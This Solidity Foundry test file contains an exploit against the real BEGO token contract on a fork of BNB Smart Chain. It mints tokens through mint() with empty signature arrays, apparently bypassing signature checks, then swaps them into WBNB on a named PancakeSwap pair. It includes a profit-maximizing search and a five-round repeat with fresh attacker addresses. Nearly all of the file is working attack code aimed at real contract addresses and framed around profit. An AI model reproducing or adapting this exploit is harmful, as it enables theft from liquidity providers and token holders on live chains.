// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IBEGO {
    function mint(uint256 _amount, string memory _txHash, address _receiver, bytes32[] memory _r, bytes32[] memory _s, uint8[] memory _v) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
}

contract BEGOMaxProfit is Test {
    IBEGO constant BEGO = IBEGO(0xc342774492b54ce5F8ac662113ED702Fc1b34972);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    
    // Known BEGO pairs
    IPancakePair constant BEGO_WBNB = IPancakePair(0x88503F48e437a377f1aC2892cBB3a5b09949faDd);
    
    address constant ATTACKER = address(0x1337);
    
    function setUp() public {
        vm.createSelectFork("https://bsc-dataseed.binance.org/", 22315679);
        vm.deal(ATTACKER, 1 ether);
    }
    
    function testFindMaxProfit() public {
        console.log("=== Finding Maximum Profitable BEGO Mint Amount ===");
        console.log("Block:", block.number);
        
        // Get initial liquidity info
        (uint112 reserve0, uint112 reserve1,) = BEGO_WBNB.getReserves();
        address token0 = BEGO_WBNB.token0();
        
        uint256 begoReserve;
        uint256 wbnbReserve;
        
        if (token0 == address(BEGO)) {
            begoReserve = uint256(reserve0);
            wbnbReserve = uint256(reserve1);
        } else {
            begoReserve = uint256(reserve1);
            wbnbReserve = uint256(reserve0);
        }
        
        console.log("\nLiquidity Pool Status:");
        console.log("BEGO in pool:", begoReserve / 1e18);
        console.log("WBNB in pool:", wbnbReserve / 1e18);
        console.log("BEGO price:", (wbnbReserve * 1e18) / begoReserve, "WBNB per BEGO");
        
        // Binary search for maximum profitable amount
        uint256 minAmount = 1000 ether;
        uint256 maxAmount = 10_000_000 ether; // 10M BEGO
        uint256 optimalAmount = 0;
        uint256 maxProfit = 0;
        
        console.log("\nSearching for optimal mint amount...");
        
        while (minAmount <= maxAmount) {
            uint256 testAmount = (minAmount + maxAmount) / 2;
            
            // Calculate expected output
            uint256 expectedWBNB = getAmountOut(testAmount, begoReserve, wbnbReserve);
            
            if (expectedWBNB > maxProfit) {
                maxProfit = expectedWBNB;
                optimalAmount = testAmount;
                minAmount = testAmount + 1;
            } else {
                maxAmount = testAmount - 1;
            }
        }
        
        console.log("\nOptimal Strategy:");
        console.log("Mint amount:", optimalAmount / 1e18, "BEGO");
        console.log("Expected WBNB:", maxProfit / 1e18);
        console.log("Expected USD value:", (maxProfit * 300) / 1e18, "(at $300/BNB)");
        
        // Now execute the exploit
        console.log("\n=== Executing Exploit ===");
        executeExploit(optimalAmount);
    }
    
    function executeExploit(uint256 mintAmount) internal {
        vm.startPrank(ATTACKER);
        
        // Mint tokens using the vulnerability
        bytes32[] memory r = new bytes32[](0);
        bytes32[] memory s = new bytes32[](0);
        uint8[] memory v = new uint8[](0);
        
        string memory txHash = string(abi.encodePacked(block.timestamp, mintAmount));
        
        console.log("\n[1] Minting BEGO tokens...");
        BEGO.mint(mintAmount, txHash, ATTACKER, r, s, v);
        console.log("Minted:", BEGO.balanceOf(ATTACKER) / 1e18, "BEGO");
        
        // Approve router
        BEGO.approve(address(ROUTER), type(uint256).max);
        
        // Swap for WBNB
        address[] memory path = new address[](2);
        path[0] = address(BEGO);
        path[1] = address(WBNB);
        
        uint256 wbnbBefore = WBNB.balanceOf(ATTACKER);
        
        console.log("\n[2] Swapping BEGO for WBNB...");
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            mintAmount,
            0, // Accept any amount
            path,
            ATTACKER,
            block.timestamp + 1
        );
        
        uint256 wbnbAfter = WBNB.balanceOf(ATTACKER);
        uint256 profit = wbnbAfter - wbnbBefore;
        
        console.log("\n=== Results ===");
        console.log("WBNB received:", profit / 1e18);
        console.log("USD value:", (profit * 300) / 1e18, "(at $300/BNB)");
        console.log("Profit: $", (profit * 300) / 1e18);
        
        vm.stopPrank();
    }
    
    // Calculate output using constant product formula
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 9975; // 0.25% fee
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 10000) + amountInWithFee;
        return numerator / denominator;
    }
    
    // Test multiple exploits in sequence
    function testMultipleExploits() public {
        console.log("=== Testing Multiple Sequential Exploits ===");
        
        uint256 totalProfit = 0;
        
        for (uint i = 0; i < 5; i++) {
            console.log("\n--- Exploit Round", i + 1, "---");
            
            // Create new attacker for each round
            address attacker = address(uint160(0x1337 + i));
            vm.deal(attacker, 0.1 ether);
            vm.startPrank(attacker);
            
            // Mint with unique tx hash
            uint256 mintAmount = 100_000 ether; // Smaller amounts for multiple rounds
            string memory txHash = string(abi.encodePacked("exploit", i, block.timestamp));
            
            bytes32[] memory r = new bytes32[](0);
            bytes32[] memory s = new bytes32[](0);
            uint8[] memory v = new uint8[](0);
            
            BEGO.mint(mintAmount, txHash, attacker, r, s, v);
            
            // Swap
            BEGO.approve(address(ROUTER), type(uint256).max);
            
            address[] memory path = new address[](2);
            path[0] = address(BEGO);
            path[1] = address(WBNB);
            
            uint256 wbnbBefore = WBNB.balanceOf(attacker);
            
            ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                mintAmount,
                0,
                path,
                attacker,
                block.timestamp + 1
            );
            
            uint256 profit = WBNB.balanceOf(attacker) - wbnbBefore;
            totalProfit += profit;
            
            console.log("Profit:", profit / 1e18, "WBNB");
            
            vm.stopPrank();
        }
        
        console.log("\n=== Total Profit from Multiple Exploits ===");
        console.log("Total WBNB:", totalProfit / 1e18);
        console.log("Total USD:", (totalProfit * 300) / 1e18, "(at $300/BNB)");
    }
}